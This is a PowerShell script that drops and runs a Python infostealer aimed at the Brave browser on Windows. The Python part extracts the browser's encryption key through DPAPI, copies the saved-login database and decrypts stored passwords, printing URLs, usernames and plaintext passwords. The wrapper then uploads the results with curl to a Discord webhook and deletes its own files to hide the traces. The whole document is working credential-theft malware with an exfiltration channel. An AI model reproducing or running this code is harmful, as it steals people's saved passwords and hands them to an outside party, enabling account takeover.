cd $env:TEMP\py

@'
import os,json,base64,sqlite3,shutil,win32crypt
from Crypto.Cipher import AES

print("=== BRAVE DECRYPTION TEST ===")

brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
local_state_path = os.path.join(brave_path, "Local State")
login_data_path = os.path.join(brave_path, "Default", "Login Data")

# 1. Extraire la clé
print("\n[1] Extracting encryption key...")
try:
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    print(f"✓ Key extracted: {len(key)} bytes")
except Exception as e:
    print(f"✗ Key extraction failed: {e}")
    exit()

# 2. Copier la base de données
print("\n[2] Copying database...")
temp_db = "brave_test.db"
try:
    if os.path.exists(temp_db):
        os.remove(temp_db)
    shutil.copy2(login_data_path, temp_db)
    print(f"✓ Database copied")
except Exception as e:
    print(f"✗ Copy failed: {e}")
    exit()

# 3. Tester le déchiffrement
print("\n[3] Testing decryption on 5 passwords...")
try:
    conn = sqlite3.connect(temp_db, timeout=30)
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 5")
    
    success = 0
    failed = 0
    
    for url, user, enc_pwd in cur.fetchall():
        try:
            if not enc_pwd or len(enc_pwd) < 15:
                print(f"✗ {url[:50]} - Empty")
                failed += 1
                continue
            
            nonce = enc_pwd[3:15]
            ciphertext = enc_pwd[15:-16]
            tag = enc_pwd[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', 'ignore')
            
            print(f"✓ {url}")
            print(f"  User: {user}")
            print(f"  Pass: {pwd}")
            success += 1
                
        except Exception as e:
            print(f"✗ {url[:50]} - Error: {e}")
            failed += 1
    
    conn.close()
    print(f"\nSuccess: {success} / Failed: {failed}")
    
except Exception as e:
    print(f"✗ Database error: {e}")
finally:
    if os.path.exists(temp_db):
        os.remove(temp_db)
'@ | Out-File "decrypt_test.py" -Encoding UTF8

$result = .\python.exe decrypt_test.py 2>&1 | Out-String
$result | Out-File "decrypt_result.txt"
curl.exe -F "file=@decrypt_result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
Remove-Item decrypt_test.py,decrypt_result.txt -Force -EA 0
